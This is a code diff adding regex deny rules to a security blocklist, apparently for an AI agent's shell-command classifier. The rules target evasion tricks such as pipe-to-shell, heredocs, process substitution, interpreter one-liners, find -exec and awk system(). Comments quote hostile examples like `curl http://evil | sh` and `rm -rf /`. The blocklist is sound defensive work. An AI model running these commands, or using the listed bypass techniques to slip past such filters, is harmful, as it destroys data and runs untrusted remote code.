@@ -90,13 +90,89 @@ export const DEFAULT_BLOCKED_RULES: SecurityRuleRaw[] = [
   // ── Evasion/obfuscation ─────────────────────────────────────────────────
   {
     pattern:
-      '(^|\\s|;|&&|\\|\\|)\\s*(eval|bash\\s+-c)\\s+.*\\b(rm|shutdown|reboot|mkfs|dd|halt|poweroff|passwd)\\b',
-    reason: '禁止通过 eval/bash -c 间接执行危险命令',
+      '(^|\\s|;|&&|\\|\\|)\\s*(eval|bash\\s+-c|sh\\s+-c)\\s+.*\\b(rm|shutdown|reboot|mkfs|dd|halt|poweroff|passwd)\\b',
+    reason: '禁止通过 eval/bash -c/sh -c 间接执行危险命令',
     severity: 'critical',
   },
   {
     pattern: '(base64\\s+-d|gunzip|gzip\\s+-d)\\s*.*\\|\\s*(bash|sh)\\b',
     reason: '禁止通过编码/压缩绕过执行命令 (encoded command execution)',
     severity: 'critical',
+  },
+  // ── Interpreter one-liners with dangerous content ────────────────────────
+  {
+    pattern:
+      '(^|\\s|;|&&|\\|\\|)\\s*(python|python3|perl|ruby)\\s+(-[ec]\\s+|-e\\s).*\\b(rm|shutdown|reboot|mkfs|dd|halt|poweroff|passwd|os\\.system|subprocess|exec)\\b',
+    reason: '禁止通过解释器一行命令执行危险操作 (interpreter one-liner evasion)',
+    severity: 'critical',
+  },
+  // ── Heredoc / process substitution feeding a shell ──────────────────────
+  {
+    pattern: '<<\\s*[\'"]?\\w+[\'"]?\\s*\\|\\s*(bash|sh)\\b',
+    reason: '禁止通过 heredoc 管道执行任意命令 (heredoc to shell)',
+    severity: 'critical',
+  },
+  {
+    pattern: '\\b(bash|sh)\\s+<<\\s*[\'"]?\\w+',
+    reason: '禁止通过 heredoc 向 shell 注入多行命令 (shell heredoc injection)',
+    severity: 'critical',
+  },
+  {
+    pattern: '<\\([^)]+\\)\\s*(bash|sh)\\b',
+    reason: '禁止通过进程替换执行任意命令 (process substitution to shell)',
+    severity: 'critical',
+  },
+  {
+    pattern: '\\b(bash|sh)\\s+<\\(',
+    reason: '禁止通过进程替换向 shell 注入命令 (shell fed by process substitution)',
+    severity: 'critical',
+  },
+  // ── Dangerous commands inside command substitution $(...) ───────────────
+  // Catches dangerous commands embedded in $() regardless of nesting.
+  // Without this, `echo $(echo $(shutdown -h now))` could bypass the
+  // blocked rules because the inner extraction regex stops at the first ).
+  // Note: \b after word-based patterns only (not after / or /dev/).
+  {
+    pattern:
+      '\\$\\([^)]*\\b(rm\\s+(-\\w*\\s+)*/|shutdown\\b|reboot\\b|mkfs\\b|dd\\s+.*of=/dev/|halt\\b|poweroff\\b|passwd\\s+root\\b)',
+    reason: '禁止在命令替换中嵌入危险命令 (dangerous command in substitution)',
+    severity: 'critical',
+  },
+  // ── Pipe to shell — arbitrary command execution via stdin ────────────────
+  // Catches `echo "rm -rf /" | bash`, `curl http://evil | sh`, etc.
+  // Piping content into a shell is a classic evasion technique — the
+  // piped content bypasses the classifier because it's data, not a command.
+  {
+    pattern: '\\|\\s*(bash|sh)(\\s|$)',
+    reason: '禁止通过管道向 shell 注入命令 (pipe to shell execution)',
+    severity: 'critical',
+  },
+  // ── find -exec with dangerous commands ───────────────────────────────────
+  // Belt-and-suspenders: the classifier also reclassifies `find -exec` as
+  // WRITE, but in Autopilot mode WRITE commands auto-execute. This rule
+  // hard-blocks find -exec with known dangerous commands regardless of mode.
+  // Note: no trailing \b after the alternation — patterns like `rm\s` end
+  // with a space, and \b after a space requires a word char next (which `-`
+  // in `rm -rf` is not).
+  {
+    pattern:
+      'find\\s+.*-exec(ute|dir)?\\s+.*\\b(rm\\s|chmod\\s|chown\\s|shutdown\\b|reboot\\b|mkfs\\b|dd\\s|halt\\b|poweroff\\b|passwd\\b)',
+    reason: '禁止通过 find -exec 执行危险命令 (find -exec with dangerous command)',
+    severity: 'critical',
+  },
+  // ── awk with command execution ───────────────────────────────────────────
+  // awk's system() and | getline can execute arbitrary commands.
+  // Catches both `system(...)` (with parens) and `"cmd" | getline` (pipe form).
+  {
+    pattern: '(awk|gawk|mawk)\\s+.*(system\\s*\\(|\\|\\s*getline)',
+    reason: '禁止通过 awk 执行系统命令 (awk command execution)',
+    severity: 'critical',
+  },
+  // ── Executing scripts from temp directories ─────────────────────────────
+  // Catches download-and-execute chains: `wget ... && bash /tmp/x.sh`
+  {
+    pattern: '\\b(bash|sh)\\s+/(tmp|dev/shm|var/tmp)/',
+    reason: '禁止执行临时目录中的脚本 (executing script from temp directory)',
+    severity: 'high',
   },
 ];
